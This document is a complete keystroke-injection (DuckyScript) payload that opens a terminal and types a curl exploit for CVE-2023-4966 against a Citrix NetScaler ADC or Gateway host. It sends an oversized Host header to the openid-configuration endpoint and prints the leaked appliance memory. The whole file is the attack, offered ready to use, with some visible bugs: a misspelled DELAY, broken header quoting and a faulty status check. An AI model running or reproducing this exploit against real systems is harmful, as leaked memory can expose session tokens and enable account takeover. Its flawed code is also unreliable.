REM ################################################################################
REM #                                                                              #
REM # Title     : Exploit Citrix NetScaler ADC and Gateway through CVE-2023-4966   #
REM # Author	: Aleff                                                            #
REM # Version	: 1.0                                                              #
REM # Category	: incident-response                                                #
REM # Target	: Citrix NetScaler ADV; NetScaler Gateway                          #
REM #                                                                              #
REM ################################################################################

REM Define here your target, so put here the Citrix ADC / Gateway target, excluding the protocol (e.g. 192.168.1.200)
DEFINE #HOSTNAME example

DEALY 2000
CTRL-ALT t
DELAY 1000

STRINGLN_BLOCK
    header_value=$(yes a | head -n 24576 | tr -d '\n')

    headers="-H 'Host:$header_value'"

    response=$(curl -s -k -H "$headers" "https://#HOSTNAME/oauth/idp/.well-known/openid-configuration" --connect-timeout 10)

    if [ $? -eq 0 ] && [ "$(echo $response | cut -c 1-3)" == "200" ]; then
        echo "--- Dumped memory ---"
        echo "$response" | cut -c 131051-
        echo "The #HOSTNAME is vulnerable!"
        echo "---      End      ---"
    else
        echo "Could not dump memory"
    fi
END_STRINGLN
